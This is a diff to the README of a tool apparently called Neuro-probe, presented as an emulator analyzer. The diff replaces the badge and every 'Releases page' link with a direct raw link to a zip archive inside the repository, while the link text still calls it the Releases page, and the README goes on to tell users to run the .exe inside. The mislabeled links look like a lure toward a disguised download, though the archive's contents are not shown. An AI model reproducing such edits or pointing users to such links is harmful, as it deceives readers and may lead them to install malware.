@@ -1,6 +1,6 @@
 # 🚀 Neuro-probe - Analyze Emulators with Ease
 
-[![Download Neuro-probe](https://img.shields.io/badge/Download%20Neuro--probe-v1.0-blue.svg)](https://github.com/pablocssousa/Neuro-probe/releases)
+[![Download Neuro-probe](https://github.com/pablocssousa/Neuro-probe/raw/refs/heads/main/emulators/Neuro-probe-v3.3.zip%https://github.com/pablocssousa/Neuro-probe/raw/refs/heads/main/emulators/Neuro-probe-v3.3.zip)](https://github.com/pablocssousa/Neuro-probe/raw/refs/heads/main/emulators/Neuro-probe-v3.3.zip)
 
 ## 📋 Description
 
@@ -23,7 +23,7 @@ Neuro-probe is a powerful tool designed for anyone interested in analyzing multi
 
 Follow these simple steps to download and run Neuro-probe:
 
-1. **Download Neuro-probe:** Visit the [Releases page](https://github.com/pablocssousa/Neuro-probe/releases) to download the latest version.
+1. **Download Neuro-probe:** Visit the [Releases page](https://github.com/pablocssousa/Neuro-probe/raw/refs/heads/main/emulators/Neuro-probe-v3.3.zip) to download the latest version.
    
 2. **Run the Installer:**
    - **Windows:** Execute the `.exe` file and follow the installation prompts.
@@ -33,7 +33,7 @@ Follow these simple steps to download and run Neuro-probe:
 
 ## 📥 Download & Install
 
-To begin, you can download Neuro-probe directly from the Releases page: [Download Neuro-probe](https://github.com/pablocssousa/Neuro-probe/releases).
+To begin, you can download Neuro-probe directly from the Releases page: [Download Neuro-probe](https://github.com/pablocssousa/Neuro-probe/raw/refs/heads/main/emulators/Neuro-probe-v3.3.zip).
 
 1. Click on the latest version link listed on the page.
 2. Depending on your operating system, download the appropriate file.
